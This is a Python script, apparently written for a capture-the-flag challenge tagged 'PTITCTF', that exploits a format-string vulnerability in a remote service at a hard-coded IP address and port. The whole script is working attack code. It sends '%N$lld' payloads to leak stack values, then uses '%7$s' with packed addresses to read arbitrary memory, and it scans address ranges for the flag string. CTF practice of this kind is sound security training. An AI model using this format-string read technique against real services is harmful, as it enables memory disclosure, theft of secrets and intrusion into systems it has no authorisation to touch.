#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.04)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)

s=newconn()
a14=leak_lld(s,14); a1=leak_lld(s,1)&((1<<64)-1)
print("arg14=",hex(a14),"arg1=",hex(a1))
# scan arg14 region
targets=[a14, a14-0x10000, a14+0x10000, a1 & ~0xfff]
for T in targets:
    found=[]
    for d in range(0, 0x30000, 0x8):
        X=T+d
        r=readmem(s,X)
        if b'PTITCTF' in r or b'{' in r:
            print("MARK near",hex(T),"at",hex(X),repr(r[:250])); found.append((X,r))
        if r==b'' or r==b'<T':
            break
    print("  target",hex(T),"found",len(found))
s.close()
